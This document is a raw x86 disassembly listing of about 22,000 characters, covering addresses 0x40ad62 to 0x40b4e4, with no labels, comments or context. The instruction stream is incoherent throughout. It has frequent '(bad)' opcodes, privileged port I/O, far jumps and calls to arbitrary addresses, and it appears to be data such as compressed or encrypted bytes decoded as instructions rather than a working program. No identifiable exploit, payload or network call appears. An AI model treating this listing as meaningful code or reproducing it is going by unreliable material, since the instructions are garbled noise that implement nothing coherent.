  40ad62:	jne    0x40ad09
  40ad64:	mov    bl,0xb8
  40ad66:	loope  0x40ad48
  40ad68:	imul   edx,DWORD PTR [edi-0x30],0x2543c6a
  40ad6f:	jle    0x40ade9
  40ad71:	mov    WORD PTR [ebp+0x795a917c],gs
  40ad77:	aaa    
  40ad78:	sub    ebp,DWORD PTR [edx-0x41345369]
  40ad7e:	inc    edi
  40ad7f:	jbe    0x40ad15
  40ad81:	or     BYTE PTR [ecx-0x25],cl
  40ad84:	pusha  
  40ad85:	out    0x96,eax
  40ad87:	cmc    
  40ad88:	mov    dl,0xe
  40ad8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad8b:	into   
  40ad8c:	mov    al,ds:0x4d0cad1
  40ad91:	push   esi
  40ad92:	xchg   DWORD PTR [edi+edi*4+0x4f],edx
  40ad96:	(bad)  
  40ad97:	mov    edx,0x2581eacc
  40ad9c:	sbb    eax,DWORD PTR [ebp+0x36]
  40ad9f:	fneni(8087 only) 
  40ada1:	test   al,0x20
  40ada3:	in     eax,0xe4
  40ada5:	lds    eax,FWORD PTR ds:0x7fddbc8
  40adab:	mov    cs,esi
  40adad:	ja     0x40ad78
  40adaf:	not    BYTE PTR [ebx]
  40adb1:	dec    esi
  40adb2:	dec    edx
  40adb3:	inc    edi
  40adb4:	les    esi,FWORD PTR [ebx]
  40adb6:	jge    0x40ae36
  40adb8:	jmp    0xb0f:0xb8f46b4c
  40adbf:	(bad)  
  40adc0:	sub    eax,0x86b8a036
  40adc5:	adc    ah,bh
  40adc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40adc8:	xchg   ecx,eax
  40adc9:	inc    esi
  40adca:	jl     0x40ade3
  40adcc:	cmp    BYTE PTR [ebp+0x7b],0xaf
  40add0:	cmp    ebx,esp
  40add2:	imul   esi,DWORD PTR [edx+eax*2+0x36],0x73
  40add7:	retf   
  40add8:	out    0x96,al
  40adda:	mov    dl,BYTE PTR [edx-0x380f870d]
  40ade0:	stos   DWORD PTR es:[edi],eax
  40ade1:	sub    eax,0x2a315681
  40ade6:	int3   
  40ade7:	pushf  
  40ade8:	out    0xe3,al
  40adea:	jp     0x40adeb
  40adec:	xchg   ebp,eax
  40aded:	enter  0x9f57,0xb5
  40adf1:	mov    ds:0x3f1f6e2b,eax
  40adf6:	adc    BYTE PTR [ebp+0x2bddaae2],bh
  40adfc:	push   0xbfaa3b87
  40ae01:	sub    cl,ch
  40ae03:	mov    ebp,0xfae07c58
  40ae08:	inc    esi
  40ae09:	add    ecx,DWORD PTR [ecx+ebx*4]
  40ae0c:	imul   DWORD PTR [edi]
  40ae0e:	dec    ebx
  40ae0f:	xor    al,0xef
  40ae11:	mov    dh,0xdd
  40ae13:	push   ds
  40ae14:	jp     0x40ad98
  40ae16:	jl     0x40adea
  40ae18:	mov    BYTE PTR [edx+ecx*8],bh
  40ae1b:	fs mov edx,0x5d733484
  40ae21:	gs pop esp
  40ae23:	shl    DWORD PTR [eax+0x237d5dc9],0x43
  40ae2a:	daa    
  40ae2b:	leave  
  40ae2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae2d:	into   
  40ae2e:	ret    0x2265
  40ae31:	dec    edi
  40ae32:	into   
  40ae33:	test   al,0x8e
  40ae35:	mov    ebx,ecx
  40ae37:	sbb    esp,ebp
  40ae39:	mov    bh,0x9a
  40ae3b:	mov    eax,ds:0x34bbdc6
  40ae40:	inc    edx
  40ae41:	sbb    BYTE PTR [ebx+0x73],0xb6
  40ae45:	outs   dx,BYTE PTR ds:[esi]
  40ae46:	imul   ebx,DWORD PTR [esi+0x1b],0xdfdd74ef
  40ae4d:	rcr    DWORD PTR [edi+0x649ad03d],cl
  40ae53:	mov    ch,0xb8
  40ae55:	out    0xac,al
  40ae57:	or     ebp,DWORD PTR [ebp-0x3b7d4534]
  40ae5d:	leave  
  40ae5e:	inc    esi
  40ae5f:	push   esi
  40ae60:	push   ebx
  40ae61:	mov    esi,0x22a44802
  40ae66:	inc    eax
  40ae67:	sbb    edx,DWORD PTR [ebx-0x7]
  40ae6a:	out    0xf1,al
  40ae6c:	popa   
  40ae6d:	popa   
  40ae6e:	daa    
  40ae6f:	sbb    ah,0xb7
  40ae72:	push   edi
  40ae73:	adc    bh,BYTE PTR [edi+0x73dab677]
  40ae79:	mov    ds:0x2ecac43,al
  40ae7e:	inc    ecx
  40ae7f:	xor    bl,BYTE PTR [edi]
  40ae81:	outs   dx,BYTE PTR ds:[esi]
  40ae82:	xor    eax,0xff06dcc6
  40ae87:	jg     0x40ae63
  40ae89:	mov    al,0x1e
  40ae8b:	dec    edi
  40ae8c:	dec    esp
  40ae8d:	(bad)  
  40ae8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae8f:	lahf   
  40ae90:	mov    ecx,0x64518a50
  40ae95:	lods   eax,DWORD PTR ds:[esi]
  40ae96:	add    DWORD PTR [edi+edi*1+0x12241c0c],esp
  40ae9d:	adc    ebp,edi
  40ae9f:	mov    ecx,0x4dba47d6
  40aea4:	add    BYTE PTR [ecx-0xb],0xb4
  40aea8:	das    
  40aea9:	push   0x16a2e5dd
  40aeae:	ds retf 0x750c
  40aeb2:	(bad)  
  40aeb3:	and    eax,0xb21c5c24
  40aeb8:	cdq    
  40aeb9:	leave  
  40aeba:	hlt    
  40aebb:	cs lock add eax,0x7f52a33e
  40aec2:	ret    0x6d66
  40aec5:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aec7:	out    dx,al
  40aec8:	dec    ecx
  40aec9:	stos   DWORD PTR es:[edi],eax
  40aeca:	cwde   
  40aecb:	call   0x6c37c67c
  40aed0:	jb     0x40aeac
  40aed2:	sbb    eax,0xe3107ae7
  40aed7:	lds    eax,FWORD PTR [esi+0x1e]
  40aeda:	idiv   ah
  40aedc:	cmp    dl,ch
  40aede:	xor    eax,edx
  40aee0:	sbb    eax,0xbe0b8193
  40aee5:	adc    esp,DWORD PTR [esi-0x61]
  40aee8:	mov    DWORD PTR [eax+0x413bdb14],edi
  40aeee:	cmp    ebp,DWORD PTR [edx]
  40aef0:	inc    esp
  40aef1:	popf   
  40aef2:	mov    ch,0xe1
  40aef4:	fbstp  TBYTE PTR [ebx+0x1c]
  40aef7:	lods   al,BYTE PTR ds:[esi]
  40aef8:	nop
  40aef9:	aad    0xd9
  40aefb:	jmp    0x9219:0x637670a2
  40af02:	pop    es
  40af03:	inc    ebp
  40af04:	sub    al,0x16
  40af06:	dec    ecx
  40af07:	fadd   DWORD PTR [esi-0x46]
  40af0a:	pop    edi
  40af0b:	xor    BYTE PTR ds:0xa2cdc4c1,ah
  40af11:	or     ecx,0xfffffff3
  40af14:	sbb    eax,0xb0ad7ab7
  40af19:	push   edx
  40af1a:	mov    ds:0x826b32d5,eax
  40af1f:	and    eax,esi
  40af21:	mov    WORD PTR [edi-0x3870ba08],gs
  40af27:	shr    DWORD PTR [ebx],1
  40af29:	xor    al,0x4a
  40af2b:	and    edx,DWORD PTR [eax-0x26da8625]
  40af31:	push   ss
  40af32:	pop    ecx
  40af33:	hlt    
  40af34:	mov    esp,DWORD PTR [edx+0x3ad1e01]
  40af3a:	arpl   WORD PTR [eax+0x6c],di
  40af3d:	xchg   edx,eax
  40af3e:	adc    bl,BYTE PTR [ebp+0x3e528193]
  40af44:	mov    edi,0xafc3d58b
  40af49:	dec    esi
  40af4a:	ins    BYTE PTR es:[edi],dx
  40af4b:	sub    DWORD PTR [ebx+0x7c],esi
  40af4e:	cmc    
  40af4f:	js     0x40afce
  40af51:	imul   esi,DWORD PTR [ebx+0x26c9c405],0x6a
  40af58:	test   DWORD PTR [edx+ebp*1-0x8079689],ecx
  40af5f:	inc    ecx
  40af60:	pop    ecx
  40af61:	jnp    0x40af42
  40af63:	xchg   esp,eax
  40af64:	inc    ebp
  40af65:	jnp    0x40af28
  40af67:	pop    ebp
  40af68:	mov    ds:0xe7d87844,al
  40af6d:	cmp    BYTE PTR [ecx+0x13495183],ah
  40af73:	mov    dl,0x67
  40af75:	and    al,0x34
  40af77:	outs   dx,DWORD PTR ds:[esi]
  40af78:	mov    ebx,0xf42a71a3
  40af7d:	adc    al,BYTE PTR [eax-0x53]
  40af80:	inc    ebx
  40af81:	mov    ch,dh
  40af83:	adc    al,0x9d
  40af85:	les    edi,FWORD PTR [ebx-0x15382c5d]
  40af8b:	xchg   DWORD PTR [edx+eax*1-0x5df6f5a2],ecx
  40af92:	sub    BYTE PTR [ebx],0x8c
  40af95:	jbe    0x40afea
  40af97:	adc    eax,0xd0a7186e
  40af9c:	push   ss
  40af9d:	fiadd  DWORD PTR [ecx*2-0x21a936d]
  40afa4:	(bad)  
  40afa6:	add    BYTE PTR [eax+0x401bb04f],ch
  40afac:	pop    ebx
  40afad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40afae:	or     al,0x34
  40afb0:	mov    ch,0x41
  40afb2:	sbb    al,0xe7
  40afb4:	dec    edx
  40afb5:	push   esp
  40afb6:	cmp    DWORD PTR [edi+ebp*4+0x4dd4e62d],esi
  40afbd:	xchg   DWORD PTR [eax+0x68165eb0],ebp
  40afc3:	les    esp,FWORD PTR [ebx-0x2596dcd0]
  40afc9:	ds push edx
  40afcb:	jo     0x40af52
  40afcd:	push   0xcb831959
  40afd2:	adc    esi,DWORD PTR [edi-0x19b16d04]
  40afd8:	mov    bl,0xdd
  40afda:	fistp  WORD PTR [ebp+0x25]
  40afdd:	xchg   esp,eax
  40afde:	push   ds
  40afdf:	or     DWORD PTR [ecx],eax
  40afe1:	xchg   BYTE PTR [eax+0x3fceb86c],cl
  40afe7:	add    DWORD PTR ds:0x8429f4e2,ebp
  40afed:	cmp    bh,BYTE PTR [ebx+eax*1+0x60fd9253]
  40aff4:	sbb    al,0x7a
  40aff6:	gs lahf 
  40aff8:	cli    
  40aff9:	scas   eax,DWORD PTR es:[edi]
  40affa:	and    DWORD PTR cs:[ebx-0x21a9084c],edi
  40b001:	inc    edx
  40b002:	xor    eax,0x4af97a3b
  40b007:	xchg   ecx,eax
  40b008:	rol    DWORD PTR [esp+eiz*4+0x6c],0xee
  40b00d:	aam    0x3d
  40b00f:	loopne 0x40afef
  40b011:	mov    bl,0x90
  40b013:	jp     0x40b08a
  40b015:	xchg   dh,al
  40b017:	leave  
  40b018:	sub    eax,DWORD PTR [esi-0x5a]
  40b01b:	adc    ecx,DWORD PTR [edx]
  40b01d:	in     al,0x50
  40b01f:	dec    edi
  40b020:	xchg   esp,eax
  40b021:	ror    BYTE PTR [ebp-0x688d9652],0xe5
  40b028:	loopne 0x40b06c
  40b02a:	imul   esi,DWORD PTR [ebx],0xffffffae
  40b02d:	sbb    BYTE PTR [eax+0x1ac334b5],bh
  40b033:	and    cl,dl
  40b035:	iret   
  40b036:	push   ecx
  40b037:	mov    al,ds:0x8605551f
  40b03c:	fcomi  st,st(6)
  40b03e:	sub    al,0x77
  40b040:	or     DWORD PTR [eax-0x2c44fb41],esi
  40b046:	sbb    eax,0xb464bee6
  40b04b:	int3   
  40b04c:	scas   al,BYTE PTR es:[edi]
  40b04d:	mov    bh,0x1e
  40b04f:	push   0xffffffbf
  40b051:	mov    edi,0xfca6d69b
  40b056:	sbb    al,0x8
  40b058:	dec    esi
  40b059:	shr    edx,0xe2
  40b05c:	test   ecx,ebp
  40b05e:	call   0xa08580c
  40b063:	xor    cl,bh
  40b065:	daa    
  40b066:	push   0xffffffbc
  40b068:	hlt    
  40b069:	push   edx
  40b06a:	out    dx,al
  40b06b:	es andps xmm1,xmm4
  40b06f:	sbb    esi,DWORD PTR [edi+0x20]
  40b072:	pushf  
  40b073:	int3   
  40b074:	outs   dx,BYTE PTR ds:[esi]
  40b075:	ins    BYTE PTR es:[edi],dx
  40b076:	lock cmc 
  40b078:	bound  edi,QWORD PTR [ebx-0x6e67ba3c]
  40b07e:	(bad)  
  40b07f:	jle    0x40b0eb
  40b081:	lea    edx,ds:0x92253737
  40b087:	pop    edx
  40b088:	mov    dl,0xa9
  40b08a:	inc    edi
  40b08b:	sub    dl,0x46
  40b08e:	jg     0x40b0e7
  40b090:	jl     0x40b07d
  40b092:	pop    edi
  40b093:	test   BYTE PTR [ecx-0x24],bl
  40b096:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b097:	add    ebx,DWORD PTR [ebp-0x7d]
  40b09a:	cmp    BYTE PTR [esp+esi*8],cl
  40b09d:	shl    BYTE PTR [edi],cl
  40b09f:	mov    cl,0x3b
  40b0a1:	pop    edx
  40b0a2:	in     eax,dx
  40b0a3:	inc    esi
  40b0a4:	dec    ebx
  40b0a5:	mov    ah,0x43
  40b0a7:	pop    ss
  40b0a8:	shr    BYTE PTR [ecx],0x63
  40b0ab:	and    dl,bl
  40b0ad:	retf   
  40b0ae:	data16 je 0x40b057
  40b0b1:	mov    edi,0xfad808cf
  40b0b6:	pop    edx
  40b0b7:	mov    dl,0xe
  40b0b9:	adc    eax,0x9874cc89
  40b0be:	cwde   
  40b0bf:	mov    cl,0xb1
  40b0c1:	mov    al,ds:0x9b3c8eeb
  40b0c7:	imul   edi,DWORD PTR [ebx+0x11],0x4a69a77d
  40b0ce:	dec    esi
  40b0cf:	xor    eax,0xdad69d1f
  40b0d4:	aad    0xe3
  40b0d6:	push   esi
  40b0d7:	fisub  WORD PTR [esp+eax*8]
  40b0da:	aas    
  40b0db:	inc    esp
  40b0dc:	sub    BYTE PTR [edx+esi*2],dh
  40b0df:	or     al,ch
  40b0e1:	out    dx,al
  40b0e2:	les    esi,FWORD PTR [esi-0x4a92faaa]
  40b0e8:	add    al,0x50
  40b0ea:	mov    ecx,0xa662033b
  40b0ef:	scas   al,BYTE PTR es:[edi]
  40b0f0:	mov    ch,0xb
  40b0f2:	and    cl,BYTE PTR [esi-0x5]
  40b0f5:	push   cs
  40b0f6:	je     0x40b141
  40b0f8:	adc    al,BYTE PTR [esi-0x5eae7d06]
  40b0fe:	push   esp
  40b0ff:	cld    
  40b100:	mov    ds:0x5c0ca02b,eax
  40b105:	aas    
  40b106:	enter  0xbf86,0xb3
  40b10a:	add    bh,BYTE PTR [eax]
  40b10c:	xor    dh,BYTE PTR [bx+di]
  40b10f:	mov    ecx,0xd1c58042
  40b114:	mov    BYTE PTR [edx-0x46],bh
  40b117:	adc    BYTE PTR [eax-0x52fbf42],al
  40b11d:	lods   al,BYTE PTR ds:[esi]
  40b11e:	push   edi
  40b11f:	jbe    0x40b0ca
  40b121:	and    DWORD PTR ds:0x6ed74304,esp
  40b127:	xchg   DWORD PTR [edx-0x6],esp
  40b12a:	fmul   DWORD PTR [esi]
  40b12c:	dec    ecx
  40b12d:	xchg   esi,eax
  40b12e:	or     ebp,DWORD PTR [ebx-0x3b]
  40b131:	and    bh,bl
  40b133:	adc    edi,edx
  40b135:	stc    
  40b136:	shl    DWORD PTR [edx-0xc73676d],1
  40b13c:	jle    0x40b10f
  40b13e:	sub    bh,BYTE PTR [edx-0x7572cdaf]
  40b144:	push   edx
  40b145:	loopne 0x40b115
  40b147:	ret    0x6a28
  40b14a:	retf   
  40b14b:	xor    al,0x6d
  40b14d:	dec    BYTE PTR [ecx+0x24]
  40b150:	repnz xor al,BYTE PTR [esi]
  40b153:	pop    es
  40b154:	pop    ds
  40b155:	cld    
  40b156:	scas   eax,DWORD PTR es:[edi]
  40b157:	jge    0x40b180
  40b159:	pop    esi
  40b15a:	jne    0x40b128
  40b15c:	inc    esp
  40b15d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b15e:	xor    BYTE PTR [ebp-0x32],0x77
  40b162:	pop    ebp
  40b163:	out    0x1b,eax
  40b165:	scas   eax,DWORD PTR es:[edi]
  40b166:	or     eax,0x98cceed2
  40b16b:	addr16 ja 0x40b144
  40b16e:	jns    0x40b1eb
  40b170:	lds    eax,FWORD PTR cs:[eax+0x5d]
  40b174:	es push esp
  40b176:	push   0x12fe8544
  40b17b:	add    esi,ebx
  40b17d:	popf   
  40b17e:	pop    edi
  40b17f:	push   edx
  40b180:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b181:	add    DWORD PTR [edi-0x49],ebp
  40b184:	jmp    0x40b176
  40b186:	call   0xfe075dcf
  40b18b:	mov    al,ds:0x23f22a54
  40b190:	or     al,0xdb
  40b192:	test   BYTE PTR [esi-0x1963b879],bl
  40b198:	shr    BYTE PTR [ecx+0x1c],cl
  40b19b:	in     al,dx
  40b19c:	add    eax,DWORD PTR [ebp+0x77]
  40b19f:	jae    0x40b21c
  40b1a1:	mov    esp,0xe1b80c45
  40b1a6:	stos   DWORD PTR es:[edi],eax
  40b1a7:	and    al,0x6b
  40b1a9:	enter  0xdc6,0xc5
  40b1ad:	adc    BYTE PTR [ebx+0xe],bh
  40b1b0:	shl    DWORD PTR [edx+0x4def93d9],0x8c
  40b1b7:	sti    
  40b1b8:	in     al,0xd7
  40b1ba:	jo     0x40b1d1
  40b1bc:	test   BYTE PTR [ecx],al
  40b1be:	lea    edi,[ebx-0x43]
  40b1c1:	outs   dx,BYTE PTR ds:[esi]
  40b1c2:	add    DWORD PTR [edx],esi
  40b1c4:	(bad)  
  40b1c5:	mov    ah,0xb0
  40b1c7:	mov    ecx,0x1c464a44
  40b1cc:	jbe    0x40b15e
  40b1ce:	mov    cl,al
  40b1d0:	xor    al,0x4b
  40b1d2:	fsub   QWORD PTR [ebx-0x24ea1922]
  40b1d8:	xchg   esp,eax
  40b1d9:	fistp  WORD PTR [ebx+eax*2-0x6b039e30]
  40b1e0:	in     eax,dx
  40b1e1:	mov    bl,0x5d
  40b1e3:	pop    ebx
  40b1e4:	mov    bl,0x75
  40b1e6:	data16 hlt 
  40b1e8:	(bad)  
  40b1ea:	(bad)  
  40b1ec:	(bad)  
  40b1ed:	and    DWORD PTR [esi],esp
  40b1ef:	mov    ecx,0x39757efd
  40b1f4:	inc    edx
  40b1f5:	xchg   ecx,eax
  40b1f6:	or     al,ah
  40b1f8:	enter  0x9992,0x50
  40b1fc:	test   BYTE PTR [esp+ebx*2],dh
  40b1ff:	mov    BYTE PTR [ebx],bl
  40b201:	jae    0x40b1d3
  40b203:	pop    ebp
  40b204:	push   ebp
  40b205:	pop    es
  40b206:	pop    eax
  40b207:	out    0x4c,eax
  40b209:	iret   
  40b20a:	ret    
  40b20b:	xor    ebx,DWORD PTR [esi]
  40b20d:	mov    ah,0xdd
  40b20f:	mov    edx,0xb13da7d2
  40b214:	cli    
  40b215:	iret   
  40b216:	sar    ah,0x92
  40b219:	xchg   ebp,eax
  40b21a:	cmp    DWORD PTR [ebx-0x71],ebx
  40b21d:	mov    edx,ds
  40b21f:	inc    ebx
  40b220:	jae    0x40b1b9
  40b222:	push   ss
  40b223:	jp     0x40b22f
  40b225:	jnp    0x40b295
  40b227:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b228:	adc    esp,DWORD PTR [ebp+ebp*4+0x34869cb7]
  40b22f:	push   ebx
  40b230:	sbb    esi,esi
  40b232:	enter  0xc891,0x8d
  40b236:	rcl    BYTE PTR [edi],cl
  40b238:	stc    
  40b239:	call   FWORD PTR [edx-0x34]
  40b23c:	xor    eax,0x6b1332b2
  40b241:	inc    eax
  40b242:	mov    DWORD PTR [ebp+0x70b63915],ebp
  40b248:	lods   al,BYTE PTR ds:[esi]
  40b249:	dec    esi
  40b24a:	mov    esp,0xbb3461c6
  40b24f:	push   eax
  40b250:	jmp    0xef8a:0x689c9932
  40b257:	cmp    al,BYTE PTR [edi]
  40b259:	or     ch,BYTE PTR [eax+0x4]
  40b25c:	es mov dh,0xc
  40b25f:	push   ss
  40b260:	(bad)  
  40b261:	cwde   
  40b262:	into   
  40b263:	mov    bh,0x15
  40b265:	test   al,0x4d
  40b267:	jo     0x40b2be
  40b269:	mov    ebp,0x51beebfd
  40b26e:	fld    TBYTE PTR [edx+0x20b12949]
  40b274:	fisttp DWORD PTR [edx]
  40b276:	add    al,0x64
  40b278:	das    
  40b279:	and    bl,dh
  40b27b:	inc    ebp
  40b27c:	sub    DWORD PTR [edi+0x11],ebp
  40b27f:	data16 int 0x98
  40b282:	adc    edi,DWORD PTR [ebx-0x79]
  40b285:	adc    bl,cl
  40b287:	rol    DWORD PTR [ebp+eiz*4+0x9],0x21
  40b28c:	(bad)  
  40b28d:	xchg   ebx,eax
  40b28e:	inc    eax
  40b28f:	adc    eax,ecx
  40b291:	cld    
  40b292:	pop    eax
  40b293:	fbstp  TBYTE PTR [eax]
  40b295:	cmc    
  40b296:	sbb    al,0x73
  40b298:	or     BYTE PTR [ecx],bl
  40b29a:	rcr    BYTE PTR [esi],1
  40b29c:	pop    ds
  40b29d:	push   0xe327a401
  40b2a2:	popa   
  40b2a3:	add    ecx,DWORD PTR [ebx-0x5f5c3537]
  40b2a9:	cli    
  40b2aa:	cmp    eax,0xbb1b578e
  40b2af:	fisub  DWORD PTR [edi+0x27]
  40b2b2:	mov    ebx,0xa35a723a
  40b2b7:	(bad)  
  40b2b9:	push   edx
  40b2ba:	push   edx
  40b2bb:	add    eax,esi
  40b2bd:	test   DWORD PTR [ecx],edx
  40b2bf:	test   al,0x65
  40b2c1:	mov    bh,0xa7
  40b2c3:	arpl   WORD PTR [ebx],dx
  40b2c5:	jne    0x40b280
  40b2c7:	sbb    al,0xb7
  40b2c9:	mov    WORD PTR fs:[ebp+ebx*2+0x46],?
  40b2ce:	repnz xlat BYTE PTR ds:[ebx]
  40b2d0:	inc    ecx
  40b2d1:	in     eax,0x27
  40b2d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2d4:	js     0x40b2cb
  40b2d6:	jg     0x40b25b
  40b2d8:	lods   eax,DWORD PTR ds:[esi]
  40b2d9:	pop    esp
  40b2da:	fucomip st,st(2)
  40b2dc:	js     0x40b26d
  40b2de:	dec    ebp
  40b2df:	mov    bh,BYTE PTR [esi+0x29]
  40b2e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2e3:	shr    DWORD PTR [ecx*2-0x12b83722],0x5e
  40b2eb:	push   edx
  40b2ec:	mov    eax,ds:0x19ef3ef3
  40b2f1:	push   ss
  40b2f2:	fld    QWORD PTR [ebx+0x58207b7c]
  40b2f8:	lods   eax,DWORD PTR ds:[esi]
  40b2f9:	imul   esi,DWORD PTR [edi+0x5777e724],0x59
  40b300:	ss pop edx
  40b302:	and    dh,bl
  40b304:	mov    cl,0xa0
  40b306:	shr    DWORD PTR [ebp*2-0x30f1983d],cl
  40b30d:	jmp    0x132dee56
  40b312:	pop    edi
  40b313:	inc    edx
  40b314:	(bad)  
  40b315:	jae    0x40b34d
  40b317:	test   eax,0xc3ca7175
  40b31c:	push   edx
  40b31d:	pop    ebp
  40b31e:	push   eax
  40b31f:	ror    BYTE PTR [esi+ecx*4],1
  40b322:	out    0x11,al
  40b324:	(bad)  
  40b325:	sbb    edx,DWORD PTR [edi+eax*4+0x5fff04c9]
  40b32c:	cwde   
  40b32d:	xchg   edi,eax
  40b32e:	mov    esp,0x5a0d29bb
  40b333:	push   edx
  40b334:	xchg   ecx,eax
  40b335:	rol    bl,0xcb
  40b338:	inc    edx
  40b339:	sbb    bh,al
  40b33b:	and    eax,0xec20dc92
  40b340:	ficomp DWORD PTR [esp+edx*2-0x22290279]
  40b347:	sahf   
  40b348:	pop    edx
  40b349:	xor    eax,0x952bcbd7
  40b34e:	xchg   DWORD PTR [ecx+edi*8-0x7b743d68],esi
  40b355:	out    dx,al
  40b356:	sbb    edi,eax
  40b358:	inc    esi
  40b359:	push   ecx
  40b35a:	lods   al,BYTE PTR ds:[esi]
  40b35b:	pusha  
  40b35c:	pop    es
  40b35d:	jns    0x40b37d
  40b35f:	mov    eax,ds:0xb3b6110
  40b364:	jmp    0x9c332e24
  40b369:	jo     0x40b372
  40b36b:	je     0x40b304
  40b36d:	dec    edi
  40b36e:	xor    ebp,ebp
  40b370:	xor    bl,BYTE PTR [eax+0x40]
  40b373:	jmp    FWORD PTR [edx+0x9fcea69]
  40b379:	sbb    edi,esi
  40b37b:	clc    
  40b37c:	adc    bl,BYTE PTR [ecx+ebp*2-0x69d5b060]
  40b383:	adc    DWORD PTR cs:0x1b05849a,esp
  40b38a:	push   es
  40b38b:	leave  
  40b38c:	cmp    eax,0xe823ffb5
  40b391:	daa    
  40b392:	enter  0xaa16,0xbd
  40b396:	(bad)  
  40b398:	jp     0x40b31e
  40b39a:	addr16 cmp esi,edx
  40b39d:	mov    bh,0xee
  40b39f:	and    BYTE PTR [edi-0x6fc1fd63],al
  40b3a5:	pop    edx
  40b3a6:	xlat   BYTE PTR ds:[ebx]
  40b3a7:	shr    DWORD PTR [edi-0x2b],cl
  40b3aa:	adc    BYTE PTR [ecx-0x245bdf1b],ah
  40b3b0:	sbb    eax,0x6293bd9c
  40b3b5:	sbb    ah,BYTE PTR [edx-0x1f168146]
  40b3bb:	js     0x40b42c
  40b3bd:	mov    ebp,0x5ceb8bd4
  40b3c2:	sbb    dh,al
  40b3c4:	dec    ecx
  40b3c5:	into   
  40b3c6:	in     al,0x95
  40b3c8:	jmp    0x40b3e1
  40b3ca:	push   ds
  40b3cb:	not    DWORD PTR [ebp+0x61]
  40b3ce:	stos   DWORD PTR es:[edi],eax
  40b3cf:	out    0x25,al
  40b3d1:	mov    ebp,0x162cd752
  40b3d6:	cvtps2pd xmm3,QWORD PTR [ebx]
  40b3d9:	mov    ds:0x14541090,al
  40b3de:	lahf   
  40b3df:	cmp    ebp,eax
  40b3e1:	jo     0x40b457
  40b3e3:	icebp  
  40b3e4:	cmc    
  40b3e5:	scas   al,BYTE PTR es:[edi]
  40b3e6:	jno    0x40b406
  40b3e8:	neg    edi
  40b3ea:	cmp    dh,ah
  40b3ec:	or     al,0xf
  40b3ee:	les    esi,FWORD PTR [edi-0x4f]
  40b3f1:	retf   0xb7e8
  40b3f4:	out    0x32,al
  40b3f6:	(bad)  
  40b3f7:	fidiv  DWORD PTR [edx]
  40b3f9:	push   esp
  40b3fa:	fstp   QWORD PTR [edi+0x24e15e68]
  40b400:	adc    ah,BYTE PTR [ecx]
  40b402:	or     DWORD PTR [ecx+0x6ae982c5],esi
  40b408:	popf   
  40b409:	ret    
  40b40a:	pop    esp
  40b40b:	inc    edx
  40b40c:	or     eax,0x7aa7d8dc
  40b411:	test   eax,0x8014182d
  40b416:	repnz bound ebx,QWORD PTR [ebx]
  40b419:	dec    esi
  40b41a:	outs   dx,BYTE PTR ds:[esi]
  40b41b:	into   
  40b41c:	lods   al,BYTE PTR ds:[esi]
  40b41d:	enter  0xf51e,0xec
  40b421:	sbb    eax,0xbdb8ea85
  40b426:	or     edx,DWORD PTR [esi]
  40b428:	ins    DWORD PTR es:[edi],dx
  40b429:	push   ds
  40b42a:	or     al,0x1f
  40b42c:	adc    eax,0xb6aefd89
  40b431:	jp     0x40b44f
  40b433:	adc    dl,BYTE PTR [ebx-0x7a7c86d6]
  40b439:	add    eax,0x9d481a0
  40b43e:	jae    0x40b4ba
  40b440:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b441:	pushf  
  40b442:	sbb    eax,0x90ec8436
  40b447:	retf   0x70a4
  40b44a:	clc    
  40b44b:	dec    eax
  40b44c:	aas    
  40b44d:	push   edx
  40b44e:	lods   eax,DWORD PTR ds:[esi]
  40b44f:	je     0x40b479
  40b451:	lea    ebp,[edi+0x26]
  40b454:	call   0xce2d0024
  40b459:	lock sbb al,0x57
  40b45c:	daa    
  40b45d:	push   esi
  40b45e:	inc    esi
  40b45f:	sti    
  40b460:	mov    ebx,0x1bac2e73
  40b465:	xchg   edx,ecx
  40b467:	pop    eax
  40b468:	outs   dx,DWORD PTR ds:[esi]
  40b469:	mov    eax,0x7d2d8ea8
  40b46e:	adc    eax,0x4286a52f
  40b473:	aaa    
  40b474:	(bad)  
  40b475:	jp     0x40b44d
  40b477:	add    DWORD PTR [esi-0x95188c2],ecx
  40b47d:	sub    dh,BYTE PTR [esi]
  40b47f:	rol    bh,0xb3
  40b482:	xor    bl,bh
  40b484:	out    0xd,eax
  40b486:	ds pop ss
  40b488:	dec    ebp
  40b489:	push   ebp
  40b48a:	loopne 0x40b470
  40b48c:	sti    
  40b48d:	into   
  40b48e:	mov    ebx,0x46a3ab93
  40b493:	js     0x40b447
  40b495:	mov    bl,0xda
  40b497:	inc    ecx
  40b498:	inc    DWORD PTR [ecx+edi*2]
  40b49b:	out    0x3e,al
  40b49d:	jecxz  0x40b469
  40b49f:	sbb    ah,BYTE PTR [ebx+0x5f76358f]
  40b4a5:	add    esi,ebx
  40b4a7:	retf   
  40b4a8:	pop    es
  40b4a9:	add    esi,ecx
  40b4ab:	aaa    
  40b4ac:	loop   0x40b4a1
  40b4ae:	rcr    DWORD PTR [edi-0x7a],1
  40b4b1:	cs leave 
  40b4b3:	fld    QWORD PTR [edi]
  40b4b5:	cmp    eax,DWORD PTR [esi]
  40b4b7:	lea    esp,[edx-0x78]
  40b4ba:	push   cs
  40b4bb:	cmp    BYTE PTR [ecx],dh
  40b4bd:	cld    
  40b4be:	and    BYTE PTR [esi],al
  40b4c0:	or     bh,BYTE PTR [esi-0x22]
  40b4c3:	or     eax,0xfb9a7984
  40b4c8:	fsub   DWORD PTR [ecx-0x2bb0e90e]
  40b4ce:	dec    esi
  40b4cf:	cmovne edi,ecx
  40b4d2:	imul   ebp,ebp,0xffffffe5
  40b4d5:	outs   dx,BYTE PTR ds:[esi]
  40b4d6:	mov    al,ds:0x2a8911df
  40b4db:	jle    0x40b4d8
  40b4dd:	adc    eax,0xf2ade9c8
  40b4e2:	push   0x5b
  40b4e4:	fistp  QWORD PTR [eax-0x3956776f]
